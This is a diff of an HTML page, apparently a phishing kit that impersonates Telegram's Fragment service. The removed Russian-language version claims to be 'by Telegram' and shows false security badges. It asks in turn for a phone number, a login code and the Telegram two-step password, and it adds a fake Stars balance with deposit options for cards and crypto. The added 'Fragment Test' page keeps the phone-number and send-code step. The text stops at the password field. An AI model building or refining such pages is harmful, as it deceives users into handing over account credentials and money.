@@ -1,663 +1,126 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<title>Fragment</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap');
-  :root {
-    --tg-blue:#2AABEE; --tg-bg:#f0f2f5; --card-bg:#ffffff;
-    --input-bg:#f1f3f6; --text-main:#1c1c1e; --text-muted:#8e8e93; --border:#e0e0e5;
-  }
-  *{box-sizing:border-box;margin:0;padding:0;}
-  body{font-family:'Nunito',sans-serif;background:var(--tg-bg);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;position:relative;overflow-x:hidden;}
-  body::before{content:'';position:fixed;inset:0;
-    background-image:
-      radial-gradient(circle at 15% 15%,rgba(42,171,238,.18) 0%,transparent 40%),
-      radial-gradient(circle at 85% 80%,rgba(42,171,238,.15) 0%,transparent 40%),
-      radial-gradient(circle at 50% 50%,rgba(42,171,238,.06) 0%,transparent 65%),
-      radial-gradient(circle at 80% 10%,rgba(42,171,238,.10) 0%,transparent 30%),
-      radial-gradient(circle at 10% 85%,rgba(42,171,238,.10) 0%,transparent 30%);
-    pointer-events:none;z-index:0;}
-  body::after{content:'';position:fixed;inset:0;
-    background-image:radial-gradient(circle,#2AABEE28 1px,transparent 1px);
-    background-size:28px 28px;pointer-events:none;z-index:0;}
-  .bg-hex{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;}
-  .bg-hex svg{width:100%;height:100%;opacity:0.045;}
-  .deco{position:fixed;border-radius:50%;pointer-events:none;z-index:0;}
-  .deco-1{width:300px;height:300px;top:-100px;right:-100px;background:radial-gradient(circle,#2AABEE44,transparent 70%);animation:float1 8s ease-in-out infinite;}
-  .deco-2{width:220px;height:220px;bottom:20px;left:-80px;background:radial-gradient(circle,#2AABEE33,transparent 70%);animation:float2 10s ease-in-out infinite;}
-  .deco-3{width:150px;height:150px;top:40%;right:-40px;background:radial-gradient(circle,#2AABEE22,transparent 70%);animation:float1 12s ease-in-out infinite reverse;}
-  .deco-4{width:100px;height:100px;top:25%;left:-20px;background:radial-gradient(circle,#2AABEE18,transparent 70%);animation:float2 9s ease-in-out infinite;}
-  @keyframes float1{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-22px) scale(1.04)}}
-  @keyframes float2{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(16px) scale(0.97)}}
-  .bg-lines{position:fixed;inset:0;pointer-events:none;z-index:0;
-    background-image:repeating-linear-gradient(45deg,transparent,transparent 40px,rgba(42,171,238,0.025) 40px,rgba(42,171,238,0.025) 41px);}
-  .splash{position:fixed;inset:0;background:linear-gradient(160deg,#0d1b2e,#1a3a5c,#0d1b2e);z-index:1000;display:flex;flex-direction:column;align-items:center;justify-content:center;animation:splashOut 0.5s ease 2.2s both;}
-  @keyframes splashOut{from{opacity:1;transform:scale(1)}to{opacity:0;transform:scale(1.04);pointer-events:none;visibility:hidden;}}
-  .splash-bg{position:absolute;inset:0;background-image:radial-gradient(circle,rgba(42,171,238,0.08) 1px,transparent 1px);background-size:24px 24px;}
-  .splash-glow{position:absolute;width:400px;height:400px;border-radius:50%;background:radial-gradient(circle,rgba(42,171,238,0.25),transparent 70%);animation:glowPulse 2s ease-in-out infinite;}
-  @keyframes glowPulse{0%,100%{transform:scale(1);opacity:0.6}50%{transform:scale(1.15);opacity:1}}
-  .splash-logo-wrap{position:relative;z-index:1;animation:logoAppear 0.6s cubic-bezier(.22,.68,0,1.4) 0.2s both;}
-  @keyframes logoAppear{from{opacity:0;transform:scale(0.3)}to{opacity:1;transform:scale(1)}}
-  .splash-circle{width:110px;height:110px;background:linear-gradient(145deg,#2AABEE,#1a7fc1);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 60px rgba(42,171,238,0.7),0 0 120px rgba(42,171,238,0.3);position:relative;overflow:hidden;}
-  .splash-circle::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 35% 30%,rgba(255,255,255,0.3),transparent 65%);border-radius:50%;}
-  .splash-circle svg{width:60px;height:60px;fill:white;position:relative;z-index:1;}
-  .splash-ring{position:absolute;border-radius:50%;border:2px solid rgba(42,171,238,0.4);animation:ringExpand 2s ease-out infinite;}
-  .splash-ring:nth-child(1){width:130px;height:130px;animation-delay:0s;}
-  .splash-ring:nth-child(2){width:170px;height:170px;animation-delay:0.4s;}
-  .splash-ring:nth-child(3){width:210px;height:210px;animation-delay:0.8s;}
-  @keyframes ringExpand{from{transform:scale(0.8);opacity:0.8}to{transform:scale(1.4);opacity:0}}
-  .splash-text{position:relative;z-index:1;margin-top:28px;text-align:center;animation:logoAppear 0.5s ease 0.7s both;}
-  .splash-text h1{font-size:32px;font-weight:900;color:white;letter-spacing:-0.5px;}
-  .splash-text p{font-size:14px;color:rgba(255,255,255,0.5);font-weight:600;margin-top:4px;letter-spacing:2px;text-transform:uppercase;}
-  .splash-dots{display:flex;gap:8px;margin-top:40px;position:relative;z-index:1;animation:logoAppear 0.4s ease 1s both;}
-  .splash-dot{width:8px;height:8px;border-radius:50%;background:rgba(42,171,238,0.4);}
-  .splash-dot:nth-child(1){animation:dotBounce 1.2s ease 1s infinite;}
-  .splash-dot:nth-child(2){animation:dotBounce 1.2s ease 1.2s infinite;}
-  .splash-dot:nth-child(3){animation:dotBounce 1.2s ease 1.4s infinite;}
-  @keyframes dotBounce{0%,80%,100%{background:rgba(42,171,238,0.3);transform:scale(1)}40%{background:#2AABEE;transform:scale(1.4)}}
-  .topbar{width:100%;max-width:480px;display:flex;align-items:center;justify-content:space-between;padding:14px 18px 10px;position:relative;z-index:10;}
-  .topbar-back{color:var(--tg-blue);font-size:17px;font-weight:700;cursor:pointer;min-width:60px;user-select:none;opacity:0;pointer-events:none;transition:opacity 0.2s;}
-  .topbar-back.visible{opacity:1;pointer-events:auto;}
-  .topbar-back:active{opacity:0.6;}
-  .topbar-title{text-align:center;}
-  .topbar-title span{display:block;font-size:17px;font-weight:800;color:var(--text-main);}
-  .topbar-title small{font-size:12px;color:var(--text-muted);font-weight:600;}
-  .topbar-spacer{min-width:60px;}
-  .card{width:calc(100% - 24px);max-width:460px;background:var(--card-bg);border-radius:24px;padding:36px 28px 28px;box-shadow:0 8px 40px rgba(42,171,238,.10),0 2px 12px rgba(0,0,0,.06);position:relative;z-index:10;margin-top:4px;animation:slideUp 0.5s cubic-bezier(.22,.68,0,1.2) both;}
-  @keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
-  .logo-wrap{display:flex;justify-content:center;margin-bottom:18px;}
-  .logo-circle{width:72px;height:72px;background:linear-gradient(135deg,#2AABEE,#1e88c8);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 6px 24px rgba(42,171,238,.35);position:relative;overflow:hidden;}
-  .logo-circle::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,.25),transparent 70%);border-radius:50%;}
-  .logo-circle svg{width:38px;height:38px;fill:white;position:relative;z-index:1;}
-  .screen-title{font-size:26px;font-weight:900;color:var(--text-main);text-align:center;margin-bottom:4px;letter-spacing:-.5px;}
-  .screen-sub{font-size:14px;color:var(--text-muted);text-align:center;margin-bottom:24px;}
-  .screen-sub a{color:var(--tg-blue);text-decoration:none;font-weight:700;}
-  .steps{display:flex;justify-content:center;gap:8px;margin-bottom:20px;}
-  .step-dot{width:8px;height:8px;border-radius:50%;background:var(--border);transition:background 0.3s,width 0.3s;}
-  .step-dot.active{background:var(--tg-blue);width:24px;border-radius:4px;}
-  .input-group{margin-bottom:12px;position:relative;}
-  .select-wrap{background:var(--input-bg);border-radius:14px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;border:2px solid transparent;transition:border-color .2s;}
-  .select-wrap.open{border-color:var(--tg-blue);}
-  .select-left{display:flex;align-items:center;gap:10px;}
-  .select-flag{font-size:22px;}
-  .select-country{font-size:16px;font-weight:700;color:var(--text-main);}
-  .select-arrow{color:var(--text-muted);font-size:18px;}
-  .dropdown{display:none;position:absolute;top:calc(100% + 6px);left:0;right:0;background:white;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.13);z-index:100;max-height:240px;overflow-y:auto;border:1.5px solid var(--border);}
-  .dropdown.open{display:block;animation:fadeDown .18s ease both;}
-  @keyframes fadeDown{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}
-  .dd-search{padding:10px 14px 6px;position:sticky;top:0;background:white;border-bottom:1px solid var(--border);}
-  .dd-search input{width:100%;border:none;outline:none;font-size:14px;font-family:'Nunito',sans-serif;font-weight:600;color:var(--text-main);background:var(--input-bg);border-radius:8px;padding:7px 10px;}
-  .dd-item{padding:11px 16px;display:flex;align-items:center;gap:10px;cursor:pointer;font-size:15px;font-weight:600;color:var(--text-main);border-bottom:1px solid #f2f2f2;transition:background .1s;}
-  .dd-item:last-child{border-bottom:none;}
-  .dd-item:hover{background:var(--input-bg);}
-  .dd-item .dd-code{color:var(--text-muted);font-weight:700;font-size:13px;margin-left:auto;}
-  .phone-wrap{background:var(--input-bg);border-radius:14px;padding:14px 16px;display:flex;align-items:center;gap:10px;border:2px solid transparent;transition:border-color .2s;}
-  .phone-wrap:focus-within{border-color:var(--tg-blue);}
-  .phone-prefix{font-size:16px;font-weight:800;color:var(--text-main);white-space:nowrap;}
-  .phone-input{border:none;outline:none;background:transparent;font-size:16px;font-weight:700;color:var(--text-main);font-family:'Nunito',sans-serif;width:100%;letter-spacing:1px;}
-  .phone-input::placeholder{color:var(--text-muted);letter-spacing:0;font-weight:600;}
-  .example-hint{font-size:12px;color:var(--text-muted);font-weight:600;margin-top:6px;padding-left:4px;}
-  .btn-main{width:100%;background:linear-gradient(135deg,#2AABEE,#1e8fd1);border:none;border-radius:14px;padding:16px;color:white;font-size:17px;font-weight:800;font-family:'Nunito',sans-serif;cursor:pointer;margin-top:8px;letter-spacing:.2px;box-shadow:0 4px 16px rgba(42,171,238,.35);transition:transform .15s,opacity .15s;position:relative;overflow:hidden;}
-  .btn-main::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 30% 40%,rgba(255,255,255,.18),transparent 65%);}
-  .btn-main:active{transform:scale(.97);}
-  .btn-main:hover{opacity:.95;}
-  .secure-badge{text-align:center;margin-top:18px;font-size:11px;font-weight:800;letter-spacing:1.5px;color:var(--text-muted);text-transform:uppercase;}
-  .error-msg{color:#e53935;font-size:13px;font-weight:700;margin-top:6px;padding-left:4px;display:none;}
-  .error-msg.show{display:block;animation:shake .3s both;}
-  @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
-  .code-hint{font-size:14px;color:var(--text-muted);text-align:center;margin-bottom:22px;font-weight:600;line-height:1.5;}
-  .code-hint strong{color:var(--text-main);}
-  .code-boxes{display:flex;gap:10px;justify-content:center;margin-bottom:16px;}
-  .code-box{width:48px;height:56px;background:var(--input-bg);border-radius:12px;border:2px solid transparent;font-size:24px;font-weight:900;color:var(--text-main);text-align:center;font-family:'Nunito',sans-serif;outline:none;transition:border-color .18s,box-shadow .18s;}
-  .code-box:focus{border-color:var(--tg-blue);box-shadow:0 0 0 3px rgba(42,171,238,.13);}
-  .code-box.filled{background:#eaf6fd;border-color:var(--tg-blue);}
-  .resend-row{text-align:center;margin-top:6px;font-size:13px;color:var(--text-muted);font-weight:600;}
-  .resend-link{color:var(--tg-blue);cursor:pointer;font-weight:700;}
-  .twofa-icon{font-size:42px;text-align:center;margin-bottom:10px;}
-  .twofa-info{background:linear-gradient(135deg,#eaf6fd,#f0f8ff);border-radius:14px;padding:14px 16px;margin-bottom:16px;border-left:4px solid var(--tg-blue);}
-  .twofa-info p{font-size:14px;font-weight:600;color:var(--text-main);line-height:1.5;}
-  .twofa-info p strong{color:var(--tg-blue);}
-  .pass-wrap{background:var(--input-bg);border-radius:14px;padding:14px 16px;display:flex;align-items:center;border:2px solid transparent;transition:border-color .2s;gap:10px;}
-  .pass-wrap:focus-within{border-color:var(--tg-blue);}
-  .pass-input{border:none;outline:none;background:transparent;font-size:16px;font-weight:700;color:var(--text-main);font-family:'Nunito',sans-serif;width:100%;letter-spacing:2px;}
-  .pass-input::placeholder{letter-spacing:0;font-weight:600;color:var(--text-muted);}
-  .eye-btn{cursor:pointer;color:var(--text-muted);font-size:20px;line-height:1;user-select:none;}
-  .eye-btn:hover{color:var(--tg-blue);}
-  .dash-header{text-align:center;margin-bottom:22px;}
-  .dash-avatar{width:64px;height:64px;border-radius:50%;background:linear-gradient(135deg,#2AABEE,#1e88c8);display:flex;align-items:center;justify-content:center;margin:0 auto 10px;font-size:28px;box-shadow:0 4px 16px rgba(42,171,238,.3);}
-  .dash-name{font-size:20px;font-weight:900;color:var(--text-main);}
-  .dash-handle{font-size:13px;color:var(--text-muted);font-weight:600;margin-top:2px;}
-  .stars-card{background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);border-radius:20px;padding:24px;margin-bottom:16px;position:relative;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.2);}
-  .stars-card::before{content:'';position:absolute;inset:0;background-image:radial-gradient(circle,rgba(255,215,0,.06) 1px,transparent 1px);background-size:20px 20px;}
-  .stars-card-label{font-size:12px;font-weight:700;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px;}
-  .stars-balance{display:flex;align-items:center;gap:10px;}
-  .stars-icon{font-size:36px;filter:drop-shadow(0 0 8px rgba(255,215,0,.6));}
-  .stars-amount{font-size:42px;font-weight:900;color:#FFD700;text-shadow:0 0 20px rgba(255,215,0,.4);}
-  .stars-unit{font-size:16px;font-weight:700;color:rgba(255,255,255,.6);align-self:flex-end;padding-bottom:8px;}
-  .stars-usd{font-size:13px;color:rgba(255,255,255,.4);font-weight:600;margin-top:4px;}
-  .sparkles{position:absolute;top:12px;right:16px;font-size:24px;opacity:0.4;animation:sparkle 3s ease-in-out infinite;}
-  @keyframes sparkle{0%,100%{opacity:.4;transform:scale(1)}50%{opacity:.8;transform:scale(1.1)}}
-  .action-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px;}
-  .action-btn{border:none;border-radius:14px;padding:14px 10px;font-size:15px;font-weight:800;font-family:'Nunito',sans-serif;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:4px;transition:transform .15s,opacity .15s;}
-  .action-btn:active{transform:scale(.96);}
-  .action-btn .action-icon{font-size:22px;}
-  .action-btn.deposit{background:linear-gradient(135deg,#00c851,#007e33);color:white;box-shadow:0 4px 14px rgba(0,200,81,.3);}
-  .action-btn.withdraw{background:linear-gradient(135deg,#2AABEE,#1e8fd1);color:white;box-shadow:0 4px 14px rgba(42,171,238,.3);}
-  .section-title{font-size:13px;font-weight:800;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;}
-  .tx-item{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid var(--border);}
-  .tx-item:last-child{border-bottom:none;}
-  .tx-icon{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;}
-  .tx-icon.in{background:#e8faf0;}
-  .tx-icon.out{background:#eaf6fd;}
-  .tx-info{flex:1;}
-  .tx-label{font-size:14px;font-weight:700;color:var(--text-main);}
-  .tx-date{font-size:12px;color:var(--text-muted);font-weight:600;margin-top:1px;}
-  .tx-amount{font-size:15px;font-weight:900;}
-  .tx-amount.in{color:#00c851;}
-  .tx-amount.out{color:var(--tg-blue);}
-  .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:400;align-items:flex-end;justify-content:center;}
-  .modal-overlay.show{display:flex;animation:fadeIn .2s ease both;}
-  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
-  .modal-sheet{background:white;border-radius:24px 24px 0 0;padding:28px 24px 40px;width:100%;max-width:480px;animation:slideSheet .3s cubic-bezier(.22,.68,0,1.2) both;}
-  @keyframes slideSheet{from{transform:translateY(100%)}to{transform:translateY(0)}}
-  .modal-handle{width:36px;height:4px;background:var(--border);border-radius:2px;margin:0 auto 20px;}
-  .modal-title{font-size:20px;font-weight:900;color:var(--text-main);margin-bottom:6px;}
-  .modal-sub{font-size:14px;color:var(--text-muted);font-weight:600;margin-bottom:20px;}
-  .amount-input-wrap{background:var(--input-bg);border-radius:14px;padding:16px;display:flex;align-items:center;gap:10px;border:2px solid transparent;transition:border-color .2s;margin-bottom:8px;}
-  .amount-input-wrap:focus-within{border-color:var(--tg-blue);}
-  .amount-star{font-size:22px;}
-  .amount-input{border:none;outline:none;background:transparent;font-size:22px;font-weight:900;color:var(--text-main);font-family:'Nunito',sans-serif;width:100%;}
-  .amount-input::placeholder{color:var(--text-muted);font-weight:600;font-size:18px;}
-  .amount-usd{font-size:12px;color:var(--text-muted);font-weight:600;margin-bottom:16px;padding-left:4px;}
-  .quick-amounts{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap;}
-  .quick-btn{border:1.5px solid var(--tg-blue);border-radius:20px;padding:6px 14px;font-size:13px;font-weight:800;color:var(--tg-blue);background:transparent;cursor:pointer;font-family:'Nunito',sans-serif;transition:background .15s,color .15s;}
-  .quick-btn:hover{background:var(--tg-blue);color:white;}
-  .timer-wrap{text-align:center;padding:10px 0;}
-  .timer-icon{font-size:52px;margin-bottom:12px;animation:pulse 1s ease-in-out infinite;}
-  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
-  .timer-title{font-size:22px;font-weight:900;color:var(--text-main);margin-bottom:6px;}
-  .timer-sub{font-size:14px;color:var(--text-muted);font-weight:600;margin-bottom:24px;line-height:1.5;}
-  .timer-circle{width:110px;height:110px;border-radius:50%;border:6px solid var(--input-bg);display:flex;flex-direction:column;align-items:center;justify-content:center;margin:0 auto 20px;background:white;box-shadow:0 4px 20px rgba(42,171,238,.15);}
-  .timer-number{font-size:32px;font-weight:900;color:var(--tg-blue);line-height:1;}
-  .timer-label{font-size:11px;font-weight:700;color:var(--text-muted);}
-  .deposit-option{display:flex;align-items:center;gap:14px;padding:14px;background:var(--input-bg);border-radius:14px;margin-bottom:10px;cursor:pointer;transition:background .15s;border:2px solid transparent;}
-  .deposit-option:hover{border-color:var(--tg-blue);background:#eaf6fd;}
-  .deposit-option-icon{font-size:28px;}
-  .deposit-option-info{flex:1;}
-  .deposit-option-name{font-size:15px;font-weight:800;color:var(--text-main);}
-  .deposit-option-desc{font-size:12px;color:var(--text-muted);font-weight:600;}
-  .deposit-option-arrow{color:var(--text-muted);font-size:18px;}
-  .btn-gray{background:var(--input-bg);color:var(--text-main);box-shadow:none;}
-  .dropdown::-webkit-scrollbar{width:5px;}
-  .dropdown::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px;}
-  .code-error{color:#e53935;font-size:13px;font-weight:700;text-align:center;margin-top:8px;display:none;}
-  .code-error.show{display:block;}
-</style>
+    <title>Fragment Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            padding: 20px;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 28px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            border: 1px solid #e0e0e5;
+            border-radius: 14px;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            background: #2AABEE;
+            color: white;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+        }
+        button:active {
+            transform: scale(0.97);
+        }
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #666;
+        }
+        .error {
+            color: #e53935;
+        }
+        .success {
+            color: #00c851;
+        }
+    </style>
 </head>
 <body>
-
-<div class="splash" id="splash">
-  <div class="splash-bg"></div>
-  <div class="splash-glow"></div>
-  <div class="splash-ring"></div>
-  <div class="splash-ring"></div>
-  <div class="splash-ring"></div>
-  <div class="splash-logo-wrap">
-    <div class="splash-circle">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg>
+    <div class="card">
+        <h2>Fragment</h2>
+        <p>Введите номер телефона</p>
+        <input type="tel" id="phone" placeholder="906 480 08 08">
+        <button onclick="sendCode()">Отправить код</button>
+        <div class="status" id="status"></div>
     </div>
-  </div>
-  <div class="splash-text">
-    <h1>Fragment</h1>
-    <p>by Telegram</p>
-  </div>
-  <div class="splash-dots">
-    <div class="splash-dot"></div>
-    <div class="splash-dot"></div>
-    <div class="splash-dot"></div>
-  </div>
-</div>
 
-<div class="bg-lines"></div>
-<div class="bg-hex">
-  <svg viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
-    <defs><pattern id="hex" x="0" y="0" width="56" height="48" patternUnits="userSpaceOnUse">
-      <polygon points="28,2 52,14 52,34 28,46 4,34 4,14" fill="none" stroke="#2AABEE" stroke-width="1"/>
-    </pattern></defs>
-    <rect width="100%" height="100%" fill="url(#hex)"/>
-  </svg>
-</div>
-
-<div class="deco deco-1"></div>
-<div class="deco deco-2"></div>
-<div class="deco deco-3"></div>
-<div class="deco deco-4"></div>
-
-<!-- Withdraw modal -->
-<div class="modal-overlay" id="withdrawModal" onclick="closeWithdrawIfOutside(event)">
-  <div class="modal-sheet">
-    <div class="modal-handle"></div>
-    <div id="wStep1">
-      <div class="modal-title">⭐ Вывести звёзды</div>
-      <div class="modal-sub">Введите количество звёзд для вывода</div>
-      <div class="amount-input-wrap">
-        <span class="amount-star">⭐</span>
-        <input class="amount-input" id="withdrawAmount" type="number" placeholder="Кол-во звёзд" min="1" oninput="updateUSD()"/>
-      </div>
-      <div class="amount-usd" id="withdrawUSD">≈ $0.00</div>
-      <div class="quick-amounts">
-        <button class="quick-btn" onclick="setAmount(100)">100</button>
-        <button class="quick-btn" onclick="setAmount(500)">500</button>
-        <button class="quick-btn" onclick="setAmount(1000)">1 000</button>
-        <button class="quick-btn" onclick="setAmount(2500)">2 500</button>
-      </div>
-      <div class="error-msg" id="withdrawError">Введите корректную сумму</div>
-      <button class="btn-main" onclick="doWithdraw()">Вывести</button>
-    </div>
-    <div id="wStep2" style="display:none;">
-      <div class="timer-wrap">
-        <div class="timer-icon">⏳</div>
-        <div class="timer-title">Запрос отправлен!</div>
-        <div class="timer-sub">Вывод обрабатывается.<br>Пожалуйста, подождите.</div>
-        <div class="timer-circle">
-          <div class="timer-number" id="timerNum">180</div>
-          <div class="timer-label">секунд</div>
-        </div>
-        <button class="btn-main btn-gray" onclick="closeWithdraw()">Закрыть</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- Deposit modal -->
-<div class="modal-overlay" id="depositModal" onclick="closeDepositIfOutside(event)">
-  <div class="modal-sheet">
-    <div class="modal-handle"></div>
-    <div class="modal-title">💳 Пополнить баланс</div>
-    <div class="modal-sub">Выберите способ пополнения</div>
-    <div class="deposit-option" onclick="depositTON()">
-      <span class="deposit-option-icon">💎</span>
-      <div class="deposit-option-info"><div class="deposit-option-name">TON</div><div class="deposit-option-desc">Пополнение через TON кошелёк</div></div>
-      <span class="deposit-option-arrow">›</span>
-    </div>
-    <div class="deposit-option" onclick="depositCard()">
-      <span class="deposit-option-icon">💳</span>
-      <div class="deposit-option-info"><div class="deposit-option-name">Банковская карта</div><div class="deposit-option-desc">Visa, Mastercard, МИР</div></div>
-      <span class="deposit-option-arrow">›</span>
-    </div>
-    <div class="deposit-option" onclick="depositCrypto()">
-      <span class="deposit-option-icon">₿</span>
-      <div class="deposit-option-info"><div class="deposit-option-name">Криптовалюта</div><div class="deposit-option-desc">BTC, ETH, USDT и другие</div></div>
-      <span class="deposit-option-arrow">›</span>
-    </div>
-    <button class="btn-main btn-gray" style="margin-top:8px;" onclick="closeDeposit()">Отмена</button>
-  </div>
-</div>
-
-<!-- Topbar -->
-<div class="topbar">
-  <div class="topbar-back" id="topbarBack" onclick="topbarGoBack()">‹ Назад</div>
-  <div class="topbar-title"><span>Fragment</span><small>мини-приложение</small></div>
-  <div class="topbar-spacer"></div>
-</div>
-
-<!-- Card -->
-<div class="card" id="mainCard">
-
-  <!-- STEP 1: Телефон -->
-  <div id="step1">
-    <div class="logo-wrap"><div class="logo-circle"><svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg></div></div>
-    <div class="steps"><div class="step-dot active"></div><div class="step-dot"></div><div class="step-dot"></div></div>
-    <div class="screen-title">Введите номер</div>
-    <div class="screen-sub">Авторизация на <a href="#">fragment.com</a></div>
-    <div class="input-group" style="position:relative;">
-      <div class="select-wrap" id="countrySelect" onclick="toggleDropdown()">
-        <div class="select-left"><span class="select-flag" id="selFlag">🇷🇺</span><span class="select-country" id="selCountry">Россия (+7)</span></div>
-        <span class="select-arrow">⌄</span>
-      </div>
-      <div class="dropdown" id="dropdown">
-        <div class="dd-search"><input type="text" placeholder="Поиск страны..." id="ddSearch" oninput="filterCountries(this.value)"/></div>
-        <div id="ddList"></div>
-      </div>
-    </div>
-    <div class="input-group">
-      <div class="phone-wrap">
-        <span class="phone-prefix" id="phonePrefix">+7</span>
-        <input class="phone-input" id="phoneInput" type="tel" placeholder="000 000 00 00" oninput="formatPhone(this)" maxlength="20"/>
-      </div>
-      <div class="example-hint" id="exampleHint">Пример: +7 (906) 480 08 08</div>
-      <div class="error-msg" id="phoneError">Введите корректный номер</div>
-    </div>
-    <button class="btn-main" id="btnStep1" onclick="goStep2()">Далее</button>
-    <div class="secure-badge">🔒 Strictly Secure via Telegram Passport</div>
-  </div>
-
-  <!-- STEP 2: Код -->
-  <div id="step2" style="display:none;">
-    <div class="logo-wrap"><div class="logo-circle"><svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg></div></div>
-    <div class="steps"><div class="step-dot"></div><div class="step-dot active"></div><div class="step-dot"></div></div>
-    <div class="screen-title">Введите код</div>
-    <div class="code-hint">Мы отправили код на<br><strong id="displayPhone"></strong></div>
-    <div class="code-boxes">
-      <input class="code-box" maxlength="1" type="tel" id="c0" oninput="codeInput(this,0)" onkeydown="codeKey(event,0)">
-      <input class="code-box" maxlength="1" type="tel" id="c1" oninput="codeInput(this,1)" onkeydown="codeKey(event,1)">
-      <input class="code-box" maxlength="1" type="tel" id="c2" oninput="codeInput(this,2)" onkeydown="codeKey(event,2)">
-      <input class="code-box" maxlength="1" type="tel" id="c3" oninput="codeInput(this,3)" onkeydown="codeKey(event,3)">
-      <input class="code-box" maxlength="1" type="tel" id="c4" oninput="codeInput(this,4)" onkeydown="codeKey(event,4)">
-    </div>
-    <div class="code-error" id="codeError">Неверный код. Попробуйте ещё раз.</div>
-    <div class="resend-row">Не получили? <span class="resend-link" onclick="resendCode()">Отправить повторно</span></div>
-    <button class="btn-main" id="btnStep2" style="margin-top:18px;" onclick="goStep3()">Подтвердить</button>
-    <div class="secure-badge">🔒 Strictly Secure via Telegram Passport</div>
-  </div>
-
-  <!-- STEP 3: 2FA -->
-  <div id="step3" style="display:none;">
-    <div class="logo-wrap"><div class="logo-circle"><svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg></div></div>
-    <div class="steps"><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot active"></div></div>
-    <div class="twofa-icon">🔐</div>
-    <div class="screen-title">Двухэтапная<br>проверка</div>
-    <div style="margin-bottom:14px;"></div>
-    <div class="twofa-info"><p>У вас включена <strong>двухэтапная аутентификация</strong>. Введите пароль Telegram.</p></div>
-    <div class="input-group">
-      <div class="pass-wrap">
